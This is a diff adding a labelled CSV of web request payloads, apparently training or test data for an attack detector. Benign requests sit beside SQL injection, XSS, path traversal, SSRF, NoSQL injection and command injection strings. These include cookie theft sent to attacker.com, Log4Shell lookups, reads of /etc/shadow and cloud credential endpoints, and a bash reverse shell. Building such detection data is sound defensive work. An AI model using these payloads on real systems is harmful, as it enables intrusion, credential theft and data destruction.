@@ -1,0 +1,52 @@
+payload,label
+"id=101&category=electronics&sort=asc&page=2",benign
+"q=laptop+bags+under+50+dollars&filter=in_stock",benign
+"{""name"": ""John Doe"", ""email"": ""john.doe@example.com"", ""role"": ""developer""}",benign
+"username=alice_smith&password=SecurePassword123!",benign
+"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",benign
+"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",benign
+"name=Sarah&message=Hello, I would like to inquire about enterprise pricing.",benign
+"{""theme"": ""dark"", ""notifications"": true, ""volume"": 80}",benign
+"/api/v1/articles/2026/cybersecurity-trends-guide",benign
+"limit=50&offset=150&filter_by=active",benign
+"{""cart_id"": ""c-9842"", ""items"": [{""sku"": ""KB-100"", ""qty"": 1}]}",benign
+"search=how+to+configure+nginx+reverse+proxy",benign
+"' OR '1'='1",sqli
+"admin' OR 1=1--",sqli
+"1' UNION SELECT null, username, password FROM users--",sqli
+"1 UNION ALL SELECT 1,2,3,table_name FROM information_schema.tables--",sqli
+"1; DROP TABLE admin_users; --",sqli
+"'; EXEC xp_cmdshell('net user hacker P@ss /add')--",sqli
+"1' AND SLEEP(5)--",sqli
+"1 AND BENCHMARK(5000000,MD5(1))",sqli
+"1'/**/UN/**/ION/**/SE/**/LECT/**/1,2,3--",sqli
+"1' HAVING 1=1--",sqli
+"<script>alert('XSS')</script>",xss
+"<img src=x onerror=alert(document.cookie)>",xss
+"<svg/onload=alert('WebGuard_Pwned')>",xss
+"<body onload=alert(1)>",xss
+"<iframe src=""javascript:alert('XSS')""></iframe>",xss
+"javascript:eval(atob('YWxlcnQoMSk='))",xss
+"<div onmouseover=""fetch('http://attacker.com/steal?c='+document.cookie)"">Hover</div>",xss
+"../../../../etc/passwd",path-traversal
+"..\\..\\..\\windows\\win.ini",path-traversal
+"../../../../etc/shadow%00",path-traversal
+"....//....//....//etc/passwd",path-traversal
+"http://169.254.169.254/latest/meta-data/",ssrf
+"http://169.254.169.254/latest/meta-data/iam/security-credentials/",ssrf
+"http://metadata.google.internal/computeMetadata/v1/",ssrf
+"url=http://127.0.0.1:8080/admin/secrets",ssrf
+"redirect=http://localhost:6379/",ssrf
+"dict://127.0.0.1:11211/stat",ssrf
+"{""username"": {""$ne"": null}, ""password"": {""$ne"": null}}",nosql
+"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}",nosql
+"{""$where"": ""sleep(5000)""}",nosql
+"user[$regex]=.*&pass[$regex]=.*",nosql
+"${jndi:ldap://attacker.com:1389/exploit}",rce
+"${jndi:rmi://192.168.1.50:1099/obj}",rce
+"${jndi:dns://attacker.dns.zone/a}",rce
+"127.0.0.1 | cat /etc/passwd",rce
+"localhost; ls -la /var/www/html",rce
+"test `id`",rce
+"; system('cat /etc/shadow')",rce
+"| bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",rce
